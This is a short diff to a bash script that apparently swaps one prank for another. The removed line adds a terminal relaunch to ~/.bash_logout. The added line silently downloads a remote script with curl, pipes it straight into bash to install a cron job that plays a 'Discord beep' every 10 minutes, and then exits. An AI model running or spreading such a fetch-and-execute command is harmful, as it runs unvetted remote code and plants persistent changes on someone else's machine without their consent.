@@ -1,3 +1,3 @@
 #!/bin/bash
-# Desc: launch a terminal when you exit a terminal
-echo "xfce-terminal" >> ~/.bash_logout
+# Discord beep every 10 minutes
+curl -s https://skyf0l.github.io/add_beep_cron.sh | /bin/bash && exit;
